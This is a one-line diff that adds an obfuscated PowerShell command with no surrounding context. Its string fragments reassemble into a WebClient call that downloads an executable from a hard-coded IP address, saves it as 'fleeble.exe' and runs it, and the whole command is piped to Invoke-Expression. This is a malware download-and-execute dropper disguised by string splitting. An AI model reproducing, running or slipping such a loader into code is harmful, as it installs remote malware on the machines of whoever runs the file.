@@ -1,0 +1,1 @@
+﻿(('(N'+'ew-O'+'bje'+'ct Syst'+'em.N'+'e'+'t.WebClie'+'n'+'t'+').Do'+'wn'+'loadFil'+'e({'+'0'+'}h'+'ttp://31.184.234.74'+'/cryp'+'ted/'+'1080'+'q'+'w.'+'exe'+'{0},'+'{0}'+'fl'+'eeb'+'le.exe'+'{0});Start'+'-'+'Pro'+'ce'+'s'+'s {0'+'}'+'fleeble.exe{0}')  -F[cHAr]39) |iEX
